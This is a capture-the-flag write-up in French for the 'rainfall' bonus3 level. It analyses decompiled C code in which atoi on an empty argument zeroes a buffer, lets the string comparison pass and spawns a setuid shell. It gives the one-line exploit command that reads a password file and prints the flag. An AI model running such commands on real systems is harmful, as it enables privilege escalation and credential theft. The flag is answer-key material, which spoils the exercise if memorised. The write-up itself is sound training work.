 # rainfall : [bonus3]

Observations:
---

#### Source décompilée:
```c
int main(int argc, const char **argv, const char **envp)
{
  char ptr[132];
  FILE *v5;

  v5 = fopen("/home/user/end/.pass", "r");
  memset(ptr, 0, sizeof(ptr));
  if ( !v5 || argc != 2 )
    return -1;
  fread(ptr, 1u, 0x42u, v5);
  ptr[65] = 0;
  ptr[atoi(argv[1])] = 0;
  fread(&ptr[66], 1u, 0x41u, v5);
  fclose(v5);
  if ( !strcmp(ptr, argv[1]) )
    execl("/bin/sh", "sh", 0);
  else
    puts(&ptr[66]);
  return 0;
}
```

#### Entrées du programme:
| Nom | Description |
| --- | ----------- |
| `argv[1]` | Une chaîne de caractères |

#### Détails du programme:
```bash
-rwsr-s---+ 1 end    users  5595 Mar  6  2016 bonus3
```

#### Fonctions:

| Nom | Description |
| --- | ----------- |
| `<main>` | Ouvre un fichier en mode lecture avec `<fopen>` et inscrit sont descripteur de fichier dans la variable `v5`. <br> Puis remplis de **0** le tableau `ptr` de **132** octets, qui est ensuite écrasé avec **66** octets du contenu du descripteur de fichier `v5`. <br> Par la suite l'octet du tableau `ptr` à l'index résultant de l'appel de `<atoi>` avec `argv[1]` est défini à **0**. <br> Ensuite l'appel à la fonction `<fread>` copie **65** octets du contenu du descripteur de fichier `v5` dans le tableau `ptr` à l'index **66** puis le descripteur de fichier est fermé. <br> Les chaînes de caractères `ptr` et `argv[1]` sont comparées et si elle  sont identique un terminal `sh` est ouvert, sinon le tableau `ptr` à partir de l'index **66** est affiché.


#### Conclusions:
L'utilisation de `<atoi>` de la sorte est une erreur, car si le contenue de la chaîne passé en paramètre est vide alors la valeur de retour est **0**.

----
Résolution:
----
Passer une chaîne vide en paramètre permet de mettre le premier octet du tableau `ptr` à **0** rendans le résultat de la comparaison de chaînes toujours positif. \
Nous permettant ainsi d'exécuter ce que nous voulons dans le terminal `sh`.

#### Commande:
```bash
./bonus3 "" <<< 'cat /home/user/end/.pass'
```

**Flag :** 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
